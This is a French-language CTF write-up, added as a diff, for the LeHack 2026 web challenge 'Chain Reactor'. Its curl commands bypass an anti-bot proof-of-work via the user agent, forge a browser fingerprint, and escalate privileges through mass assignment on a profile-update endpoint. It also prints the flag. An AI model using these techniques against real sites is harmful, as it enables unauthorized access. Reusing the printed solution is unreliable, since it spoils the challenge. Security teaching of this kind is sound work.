@@ -1,0 +1,60 @@
+---
+title: Write-up LeHack CTF 2026 - Chain Reactor
+date: '2026-07-02'
+description: 'Catégorie : Web / Élévation de privilèges'
+tags:
+  - Web
+---
+**Catégorie :** Web / Élévation de privilèges
+**Flag :** `leHACK{S7sT3m1c-4ccess-Gr4nted}`
+
+## 1. Introduction
+L'objectif est d'infiltrer la plateforme `https://chain-reactor.wargame.rocks/` inspirée d'un univers dystopique pour y capturer le premier flag.
+
+## 2. Concepts clés
+* **Bypass de Proxy anti-bot :** Contournement de solutions de filtrage (ici, Anubis) en ciblant les signatures d'agent utilisateur (User-Agent).
+* **Mass Assignment (Assignation de masse) :** Vulnérabilité permettant d'écraser des champs internes (comme les rôles) en soumettant des clés non attendues lors de la mise à jour de profils.
+* **Fingerprint Bypass :** Établissement d'une session valide en envoyant une empreinte navigateur simulée via l'API.
+
+## 3. White-boxing et analyse
+L'analyse du code JavaScript client (`auth.js`, `fp.js`, `admin.js`) et de l'endpoint `/api/routes` révèle :
+- Une protection Proof-of-Work (Anubis) qui bloque les navigateurs classiques mais peut être contournée en utilisant l'agent utilisateur par défaut de `curl`.
+- Un processus d'inscription vérifiant que l'empreinte client a été soumise au moins 3 secondes avant la création du compte.
+- Un code de conditionnement requis pour l'inscription. Après brute-force basé sur l'univers littéraire *Le Meilleur des mondes*, le mot-clé **`soma`** s'avère correct.
+- Une vulnérabilité d'assignation de masse sur `/api/profile/update` : l'habilitation `clearance` peut être modifiée par le client.
+
+## 4. Résolution
+### A. Inscription et Connexion
+Nous initialisons notre session, simulons le fingerprinting, attendons 3 secondes, puis créons un compte citoyen standard :
+```sh
+# Fingerprint et session
+curl -s -c cookies.txt https://chain-reactor.wargame.rocks/auth > /dev/null
+curl -s -b cookies.txt -c cookies.txt -X POST -H "Content-Type: application/json" \
+  -d '{"sw":1920,"sh":1080,"cd":24,"pd":1,"iw":1920,"ih":1080,"tz":0,"lang":"en-US","langs":1,"plugins":0,"wd":0,"cores":8,"mem":8,"touch":0,"cvs":12345,"gpu":"Intel","auto":0}' \
+  https://chain-reactor.wargame.rocks/api/fp
+
+# Inscription (après 3 secondes de pause)
+sleep 3
+curl -s -b cookies.txt -c cookies.txt -X POST -H "Content-Type: application/json" \
+  -d '{"username": "salut_c_anton", "password": "123soleil", "code": "soma", "_h": 1}' \
+  https://chain-reactor.wargame.rocks/api/auth/register
+
+# Connexion
+curl -s -b cookies.txt -c cookies.txt -X POST -H "Content-Type: application/json" \
+  -d '{"username": "salut_c_anton", "password": "123soleil"}' \
+  https://chain-reactor.wargame.rocks/api/auth/login
+```
+
+### B. Escalade et Capture du Flag
+Nous exploitons l'assignation de masse pour modifier notre rôle vers `Controller`, puis nous récupérons le flag :
+```sh
+# Escalade de privilèges
+curl -s -b cookies.txt -X POST -H "Content-Type: application/json" \
+  -d '{"clearance": "Controller"}' \
+  https://chain-reactor.wargame.rocks/api/profile/update
+
+# Récupération du flag
+curl -s -b cookies.txt https://chain-reactor.wargame.rocks/api/admin/flag
+```
+
+* **Flag obtenu** : `leHACK{S7sT3m1c-4ccess-Gr4nted}`
